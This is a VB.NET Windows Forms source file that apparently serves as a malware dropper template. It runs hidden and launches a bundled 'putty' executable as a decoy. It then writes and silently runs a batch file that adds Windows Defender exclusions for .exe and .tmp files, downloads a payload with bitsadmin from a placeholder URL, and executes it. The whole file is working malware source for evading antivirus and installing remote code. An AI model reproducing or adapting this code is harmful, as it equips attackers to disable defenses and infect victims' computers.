Imports System.IO


Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.Opacity = 0
        Me.ShowInTaskbar = False



        Dim Ressourcl() As Byte = My.Resources.putty



        FileOpen(1, Environ("tmp") & "\putty.exe", OpenMode.Binary) 'here insert exe file nam e
        FilePut(1, Ressourcl)
        FileClose(1)
        Dim files As String = Environ("tmp") & "\putty.exe" 'here insert exe file name
        Dim process As Process = Process.Start(files)

        System.Threading.Thread.Sleep(20000)




        Dim file As System.IO.StreamWriter
        Dim appDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        Dim FullFileName As String = Path.Combine(appDataPath, "test.bat")
        file = My.Computer.FileSystem.OpenTextFileWriter(FullFileName, True)
        file.WriteLine("")
        file.WriteLine("powershell.exe -command ""Add-MpPreference -ExclusionExtension .tmp """)
        file.WriteLine("")
        file.WriteLine("powershell.exe -command ""Add-MpPreference -ExclusionExtension .exe """)
        file.WriteLine("")
        file.WriteLine("bitsadmin /transfer Explorers /download /priority FOREGROUND https://direct-url-ofpayload/payload.exe   %temp%\payload.exe")
        file.WriteLine("")
        file.WriteLine("cd %TEMP%")
        file.WriteLine("")
        file.WriteLine("timeout 10")

        file.WriteLine("")

        file.WriteLine("start payload.exe")
        file.Close()

        Shell("cmd /c "" cd %APPDATA% &&  test.bat """, AppWinStyle.Hide, True)











    End Sub


End Class
